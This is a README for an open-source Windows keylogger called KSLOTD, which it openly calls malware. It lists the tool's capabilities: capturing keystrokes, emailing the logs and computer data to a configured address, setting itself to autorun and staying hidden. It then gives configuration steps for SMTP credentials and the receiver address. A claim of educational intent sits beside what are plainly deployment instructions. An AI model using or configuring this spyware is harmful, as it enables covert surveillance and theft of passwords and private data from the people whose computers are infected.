# KSLOTD
Open Source Key stroke logger for Windows Devices. See license for more details.

This piece of .NET software is designed with educative intentions on the field of malware coding mechanisms.This is usefull to the community by, for example: creating algorithims capable of picking this patterns and block the malware before an attack is fullfilled. 

I dont accept any responsibility or liability for the use of this licensed work.

## v1.0 Features:
* Keylogger

* Spyware send emails with log and computer data

* Autoruns setup

* Only displayed on Task Manager

To use this malware modify _SysMainProcess.Constants.cs_ with the required parameters:

`private const ushort SMTP_PORT = Your SMTP port;`  
`private const uint PODCAST_INTERVAL = Interval time in miliseconds at which a podcast is broadcasted;`  
`private static readonly string[] PODCAST_EMISSOR_CREDENTIALS = { "EMISSOR MAIL", "PASSWORD" };`  
`private const string PODCAST_RECEIVER = "RECEIVER MAIL";`  
`private const ushort THREAD_SLEEP_TIME = Time in miliseconds the thread is sleeping;`  
`private const ushort MIN_ASCII_CODE = Minimun ASCII code used;`  
`private const ushort MAX_ASCII_CODE = Maximun ASCII code used;`  
`private const string REGISTRY_FILE_NAME = "YourRegistryFileName.dll";`  
